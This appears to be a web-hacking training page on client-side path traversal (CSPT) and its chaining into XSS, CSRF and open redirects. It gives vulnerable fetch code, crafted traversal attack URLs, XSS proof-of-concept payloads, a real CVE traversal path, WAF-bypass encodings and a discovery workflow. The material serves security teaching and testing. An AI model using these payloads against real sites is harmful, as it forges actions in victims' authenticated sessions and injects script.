---
layout: training-page
title: "Client Side Path Traversal — Red Team Academy"
module: "Web Hacking"
tags:
  - cspt
  - csrf
  - xss
  - path-traversal
  - web
page_key: "web-client-side-path-traversal"
render_with_liquid: false
---

# Client Side Path Traversal

Client-Side Path Traversal (CSPT), also called "On-site Request Forgery," is a vulnerability where an application's front-end JavaScript constructs a `fetch` or XHR URL using user-controlled input without proper path encoding. By injecting `../` sequences, an attacker redirects the request to an arbitrary endpoint on the same origin. Because the request originates from the victim's browser, it automatically carries the victim's cookies and authentication headers — bypassing same-site cookie restrictions and anti-CSRF token validation.

## How CSPT Works

A page takes a user-controlled value (from a query parameter, hash, or path segment) and places it directly into a `fetch` call:

```
// Vulnerable code on the page
const newsId = new URLSearchParams(window.location.search).get('newsitemid');
fetch('/newitems/' + newsId);  // newsitemid is not sanitized
```

By injecting `../` sequences into `newsitemid`, the browser normalizes the path and sends the request to a different endpoint:

```
# Original request
GET /newitems/123

# With path traversal injection
GET /newitems/../pricing/default.js?cb=alert(1)
# Normalized by browser to:
GET /pricing/default.js?cb=alert(1)
```

## CSPT to XSS

CSPT becomes XSS when the response from the traversed endpoint is reflected into the DOM without sanitization. The attacker chains a CSPT source (the traversable parameter) with an XSS sink (an endpoint that reflects its input).

**Real example:**

```
# Source page fetches content based on newsitemid parameter
https://example.com/static/cms/news.html?newsitemid=<id>

# Sink: text injection at /pricing/default.js via cb parameter
https://example.com/pricing/default.js?cb=alert(document.domain)//

# CSPT payload combining both — inject ../pricing/default.js path and XSS payload
https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

## CSPT to CSRF (CSPT2CSRF)

CSPT can bypass CSRF defenses because the fetch is initiated by the legitimate application front-end. The browser attaches CSRF tokens and SameSite cookies automatically. This enables CSRF-equivalent impact against endpoints that would normally be protected.

| Capability | Classic CSRF | CSPT2CSRF |
| --- | --- | --- |
| POST CSRF | Yes | Yes |
| Control the request body | Yes | No |
| Works with anti-CSRF token | No | Yes |
| Works with SameSite=Lax | No | Yes |
| GET / PATCH / PUT / DELETE | No | Yes |
| 1-click attack | No | Yes |

### Real-World CSPT2CSRF Examples

```
# CVE-2023-45316 — Mattermost POST sink
/<team>/channels/channelname?telem_action=under_control&forceRHSOpen\
&telem_run_id=../../../../../../api/v4/caches/invalidate

# CSPT to cancel a resource (GET sink)
https://example.com/signup/invite?email=foo%40bar.com\
&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=
```

## Discovery Methodology

CSPT sources are parameters that end up in a URL path component of a client-side HTTP request. Look for:

- Query parameters that get placed in fetch/XHR URLs: `id=`, `page=`, `path=`, `resource=`
- Hash fragments used to build API calls
- Path segments extracted with `location.pathname` and passed to fetch

CSPT sinks are endpoints that produce exploitable responses when traversed to:

- Endpoints that reflect input into the response (XSS sinks)
- State-changing API endpoints that accept GET, POST, PATCH, DELETE (CSRF sinks)

### Burp Extension — Automated Discovery

```
# Install the CSPTBurpExtension from the BApp Store
# It passively monitors traffic and flags parameters injected into fetch URLs
# Also supports active scanning with ../  payloads
```

### WAF Bypass via Encoding

WAFs that filter raw `../` may miss encoded variants:

```
# Double URL encode
..%2F
%2E%2E%2F
%2E%2E/
..%252F  (double encoded %25 = %)

# Bypass with extra slashes
....//  (resolved to ../ by some normalizers)
```

## Tools

- [doyensec/CSPTBurpExtension](https://github.com/doyensec/CSPTBurpExtension) — Burp Suite extension to find and exploit CSPT
- [doyensec/CSPTPlayground](https://github.com/doyensec/CSPTPlayground) — Open-source lab environment for CSPT practice

---

## CSPT vs Server-Side Path Traversal

CSPT is fundamentally different from server-side path traversal (SSPT):

| Dimension | Server-Side Path Traversal | Client-Side Path Traversal |
| --- | --- | --- |
| Execution | Server resolves the path | Browser normalizes the URL path |
| Target | Files on the server filesystem | API endpoints on the same origin |
| Auth bypass | No | Yes — uses victim's cookies/tokens |
| CSRF protection | N/A | Bypassed (request is same-site) |
| Example impact | Read /etc/passwd | Forge API requests as the victim |
| Primary tool | User input → file read function | User input → fetch/XHR URL |

In CSPT, the traversal payload does not reach the filesystem. The browser normalizes the URL path and sends an HTTP request to a different path on the same origin. The value of this is that the forged request carries the victim's authenticated session automatically.

---

## Types of CSPT

### CSPT2XSS

The traversed endpoint reflects part of the request back in its response, and that response is inserted into the DOM:

```
// Vulnerable client code
const id = location.hash.slice(1);
fetch('/api/items/' + id)
  .then(r => r.text())
  .then(html => { document.getElementById('content').innerHTML = html; });
```

Attack URL:
```
https://victim.com/page#../xss-reflection-endpoint?input=<img src=x onerror=alert(origin)>
```

### CSPT2CSRF

The traversed endpoint performs a state-changing action. The CSPT is triggered by visiting a crafted URL; no user interaction with the target page is required beyond the initial click:

```javascript
// Vulnerable code — id from URL goes into API path
const orderId = new URLSearchParams(location.search).get('order');
fetch('/api/orders/' + orderId + '/status')
  .then(r => r.json())
  .then(data => displayStatus(data));
```

Attack URL that cancels a different order:
```
https://victim.com/order-status?order=../../../api/orders/VICTIM_ORDER_ID/cancel?x=
```

### CSPT2Open-Redirect

The CSPT causes the browser to be redirected by traversing to a redirect endpoint:

```javascript
// The traversal lands on a redirect endpoint
fetch('/api/data/' + userInput)
  .then(r => { if (r.redirected) window.location = r.url; });
```

---

## Manual Testing Methodology

### Step 1 — Identify JavaScript Fetch/XHR Calls

Review page JavaScript for patterns where user-controlled values are concatenated into URL paths:

```javascript
// Vulnerable patterns to look for:
fetch('/api/' + param)
fetch(`/api/items/${itemId}`)
axios.get('/resource/' + id)
$.get('/data/' + value)
new XMLHttpRequest().open('GET', '/endpoint/' + input)
```

Search for these patterns in JS files:

```bash
# Download all JS from the target
wget -r -np -nd -A "*.js" https://target.com/static/

# Search for fetch with concatenation
grep -E "fetch\(['\"]?/[^'\"]+['\"]?\s*\+\s*" *.js
grep -E "fetch\(\`/[^\`]+\$\{" *.js
```

### Step 2 — Map Parameters to Fetch Calls

For each fetch call with a user-controlled component, identify which URL parameter or state value controls the path. Test with a benign traversal:

```
# Replace the parameter value with a traversal that targets a known endpoint
# If the application fetches /api/items/123, try /api/items/../users/me
# Check if the response changes to reflect the /api/users/me response
```

### Step 3 — Find XSS Sinks

Browse the application looking for endpoints that reflect input in their response without HTML encoding. Check:

```
# Does this endpoint reflect the query parameter in the response?
GET /api/error?message=test

# Does this endpoint return JSONP-style callback?
GET /api/data?callback=test
```

### Step 4 — Find CSRF Sinks

Enumerate all state-changing API endpoints (actions that modify data, delete resources, change settings). These are CSPT2CSRF sinks.

### Step 5 — Build the Attack URL

Combine source and sink into a single crafted URL:

```
# Source: newsitemid parameter on /news.html
# Sink: /api/admin/cache/clear (GET request that flushes caches)

# Attack URL:
https://victim.com/news.html?newsitemid=../../../../api/admin/cache/clear?x=
```

---

## Exploit Chain: CSPT to CSRF

Full worked example of CSPT2CSRF:

**Scenario:** A project management application loads task details based on a `taskId` URL parameter. The frontend fetches `/api/tasks/TASKID/details` and renders the result. There is also a `/api/tasks/TASKID/delete` endpoint that deletes a task when called with GET. The delete endpoint is CSRF-protected — it checks for same-site cookies — but it does NOT require a CSRF token in the body because it was intended to be called only from the front-end.

**Vulnerable JavaScript:**
```javascript
const taskId = new URLSearchParams(location.search).get('taskId');
fetch('/api/tasks/' + taskId + '/details')
  .then(r => r.json())
  .then(data => renderTask(data));
```

**Attack URL:**
```
https://victim.com/tasks?taskId=VICTIM_TASK_ID/../../VICTIM_TASK_ID/delete?x=
```

When the victim visits this URL, the browser normalizes the path:
```
/api/tasks/VICTIM_TASK_ID/../../VICTIM_TASK_ID/delete?x=/details
→ normalized to: /api/tasks/VICTIM_TASK_ID/delete?x=
```

The victim's browser sends a GET request to `/api/tasks/VICTIM_TASK_ID/delete` with the victim's cookies. The task is deleted. SameSite=Lax cookies are included because the request is same-site (same origin, triggered by navigation).

---

## Exploit Chain: CSPT to XSS

**Scenario:** A content platform shows articles based on an `articleId` parameter. The JavaScript fetches the article and injects the HTML content directly into the DOM. A separate JSONP-style debug endpoint exists at `/debug/echo?data=PAYLOAD&callback=fn`.

**Vulnerable JavaScript:**
```javascript
const articleId = location.pathname.split('/').pop();
fetch('/api/articles/' + articleId)
  .then(r => r.text())
  .then(html => {
    document.getElementById('article-body').innerHTML = html;
  });
```

**JSONP/reflection endpoint:**
```
GET /debug/echo?data=test&callback=fn
Response: fn("test")
```

**Attack URL:**
```
https://victim.com/article/../../../debug/echo?data=<img src=x onerror=alert(origin)>&callback=ignored
```

The fetch requests `/debug/echo?data=<img src=x onerror=alert(origin)>`, the response is inserted into innerHTML, and the XSS triggers.

---

## PortSwigger Web Security Academy CSPT Labs

PortSwigger's Web Security Academy covers CSPT in their "Path Traversal" and "CSRF" modules. Relevant lab topics:

- File path traversal: simple case (understanding the base concept)
- On-site request forgery (OSRF) — the original PortSwigger framing for CSPT2CSRF
- Exploiting clickjacking as a delivery mechanism for CSPT payloads

Practice at: `portswigger.net/web-security/csrf/bypassing-samesite-restrictions`

---

## Automation with Custom Burp Extension

The CSPTBurpExtension from Doyensec provides:

1. **Passive detection**: monitors all requests and responses, identifies JavaScript code that places URL parameters into fetch/XHR paths.
2. **Active scanning**: for flagged parameters, injects `../` traversal payloads and reports parameters that cause the fetch target to change.
3. **Sink enumeration**: helps map which endpoints the traversal can reach.

Manual workflow in Burp without the extension:

```
1. In Proxy → HTTP History, search for "fetch(" or "XMLHttpRequest" in response bodies
2. For each hit, identify which URL parameters feed into the fetch path
3. Send the request to Repeater
4. Modify the parameter value to include ../
5. Observe whether the server receives a request to a different path
6. Chain with XSS or CSRF sinks
```

---

## Resources

- Exploiting CSPT to Perform CSRF — Introducing CSPT2CSRF — Maxence Schmitt — `blog.doyensec.com/2024/07/02/cspt2csrf.html`
- CSPT2CSRF Whitepaper — Maxence Schmitt — `doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf`
- On-Site Request Forgery — Dafydd Stuttard — `portswigger.net/blog/on-site-request-forgery`
- Bypassing WAFs to Exploit CSPT Using Encoding Levels — Matan Berson — `matanber.com/blog/cspt-levels`
- Leaking Jupyter Auth Token via CSPT Chaining — Davwwwx — `blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/`
- Bypassing File Upload Restrictions to Exploit CSPT — Maxence Schmitt — `blog.doyensec.com/2025/01/09/cspt-file-upload.html`
- CSPTPlayground — Hands-on CSPT Practice — `github.com/doyensec/CSPTPlayground`
